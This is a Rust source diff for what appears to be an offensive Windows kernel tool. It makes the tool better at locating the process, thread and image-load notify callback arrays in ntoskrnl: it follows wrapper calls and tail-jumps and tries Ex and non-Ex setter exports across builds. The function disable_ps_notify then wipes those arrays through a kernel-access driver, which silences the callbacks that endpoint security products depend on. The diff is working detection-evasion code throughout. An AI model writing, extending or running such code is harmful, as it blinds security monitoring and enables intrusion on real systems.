@@ -131,37 +131,53 @@ fn collect_lea_rip(buf: &[u8], base_rva: u64) -> Vec<u64> {
     out
 }
 
-fn find_first_call(buf: &[u8], base_rva: u64) -> Option<u64> {
-    let mut i = 0usize;
-    while i + 5 <= buf.len() {
-        if buf[i] == 0xE8 {
-            let disp = i32::from_le_bytes(buf[i+1..i+5].try_into().unwrap());
-            let next_rip = base_rva + (i as u64) + 5;
-            return Some((next_rip as i64 + disp as i64) as u64);
-        }
-        i += 1;
-    }
-    None
-}
-
 /// Enumerate every rip-relative-lea target reachable from a setter's own body
-/// AND the body of its first callee (so both direct setters and thin wrappers
-/// resolve).
+/// AND the bodies of transfers it makes (E8 CALL or E9 JMP), up to a small
+/// hop budget. Handles the layered wrappers modern nt uses for the notify
+/// setters (setter → PspSet* → Psp*Internal) where the array `lea` only
+/// appears in the innermost frame.
 fn setter_lea_targets(nt_disk: usize, setter: &str, nt_kbase: u64) -> Vec<u64> {
-    let rva = match export_rva(nt_disk, setter) {
+    let start_rva = match export_rva(nt_disk, setter) {
         Some(v) => v, None => return vec![],
     };
-    let s1 = unsafe {
-        std::slice::from_raw_parts((nt_disk + rva as usize) as *const u8, 0x200)
-    };
-    let mut targets = collect_lea_rip(s1, rva);
-    if let Some(callee_rva) = find_first_call(s1, rva) {
-        let s2 = unsafe {
-            std::slice::from_raw_parts((nt_disk + callee_rva as usize) as *const u8, 0x200)
-        };
-        targets.extend(collect_lea_rip(s2, callee_rva));
+    let mut targets: Vec<u64> = Vec::new();
+    let mut visited: Vec<u64> = Vec::new();
+    let mut frontier: Vec<u64> = vec![start_rva];
+
+    for _hop in 0..4 {
+        if frontier.is_empty() { break; }
+        let mut next: Vec<u64> = Vec::new();
+        for rva in frontier.drain(..) {
+            if visited.contains(&rva) { continue; }
+            visited.push(rva);
+            let buf = unsafe {
+                std::slice::from_raw_parts((nt_disk + rva as usize) as *const u8, 0x300)
+            };
+            for t in collect_lea_rip(buf, rva) {
+                targets.push(nt_kbase + t);
+            }
+            // Follow only transfers that fall inside the setter's early
+            // prologue (< 0x40 bytes) — that's where the tail-jump / thin
+            // wrapper call to the internal helper lives. Deeper transfers
+            // are conditional branches inside the body and following them
+            // explodes the search space.
+            let prologue_end = 0x40.min(buf.len());
+            let mut i = 0usize;
+            while i + 5 <= prologue_end {
+                if buf[i] == 0xE8 || buf[i] == 0xE9 {
+                    let disp = i32::from_le_bytes(buf[i+1..i+5].try_into().unwrap());
+                    let next_rip = rva + (i as u64) + 5;
+                    let tgt = (next_rip as i64 + disp as i64) as u64;
+                    next.push(tgt);
+                    i += 5;
+                    continue;
+                }
+                i += 1;
+            }
+        }
+        frontier = next;
     }
-    targets.into_iter().map(|t| nt_kbase + t).collect()
+    targets
 }
 
 // ─── Ps notify arrays ───────────────────────────────────────────────────────
@@ -209,21 +225,53 @@ fn wipe_ps_array(
     Ok(wiped)
 }
 
+/// Try a list of exported setter candidates. Collect all rip-relative lea
+/// targets reachable from any of them (thin wrappers, tail-jumps, Ex vs
+/// non-Ex — Win10/11 uses different layerings depending on the build), then
+/// pick the first candidate that validates as an `_EX_FAST_REF` array.
+fn resolve_ps_array(
+    drv: &Astra, cr3: u64, nt_disk: usize, nt_kbase: u64, setters: &[&str],
+) -> Result<(String, u64), String> {
+    let mut all: Vec<u64> = Vec::new();
+    let mut tried: Vec<&str> = Vec::new();
+    for s in setters {
+        if export_rva(nt_disk, s).is_none() { continue; }
+        tried.push(*s);
+        all.extend(setter_lea_targets(nt_disk, s, nt_kbase));
+    }
+    all.sort_unstable();
+    all.dedup();
+    for va in &all {
+        if validate_ps_array(drv, cr3, *va) {
+            return Ok((tried.join("|"), *va));
+        }
+    }
+    Err(format!(
+        "no valid array candidate across [{}] ({} raw lea targets tried)",
+        tried.join(", "), all.len()
+    ))
+}
+
 pub fn disable_ps_notify(
     drv: &Astra, cr3: u64, nt_kbase: u64, mods: &[KernelModule],
 ) -> Result<usize, String> {
     let (nt_disk, _) = load_image("ntoskrnl.exe")?;
     let mut total = 0usize;
-    for (setter, label) in &[
-        ("PsSetCreateProcessNotifyRoutineEx", "PspProc"),
-        ("PsSetCreateThreadNotifyRoutine",    "PspThrd"),
-        ("PsSetLoadImageNotifyRoutine",       "PspImg "),
-    ] {
-        let cands = setter_lea_targets(nt_disk, setter, nt_kbase);
-        let arr = cands.into_iter()
-            .find(|&va| validate_ps_array(drv, cr3, va))
-            .ok_or_else(|| format!("{setter}: no valid array candidate"))?;
-        println!("[+] {} → array VA 0x{:X}", setter, arr);
+    // Try Ex first when it exists — on 24H2 the non-Ex thread/image setters
+    // are 5-byte tail-JMPs into the Ex form, so hitting Ex directly halves
+    // the disassembly depth we need to follow.
+    let groups: &[(&[&str], &str)] = &[
+        (&["PsSetCreateProcessNotifyRoutineEx",
+           "PsSetCreateProcessNotifyRoutine"],  "PspProc"),
+        (&["PsSetCreateThreadNotifyRoutineEx",
+           "PsSetCreateThreadNotifyRoutine"],   "PspThrd"),
+        (&["PsSetLoadImageNotifyRoutineEx",
+           "PsSetLoadImageNotifyRoutine"],      "PspImg "),
+    ];
+    for (setters, label) in groups {
+        let (used, arr) = resolve_ps_array(drv, cr3, nt_disk, nt_kbase, setters)
+            .map_err(|e| format!("{}: {e}", setters[0]))?;
+        println!("[+] {} → array VA 0x{:X}  (via {})", label.trim(), arr, used);
         total += wipe_ps_array(drv, cr3, arr, mods, label)?;
     }
     Ok(total)
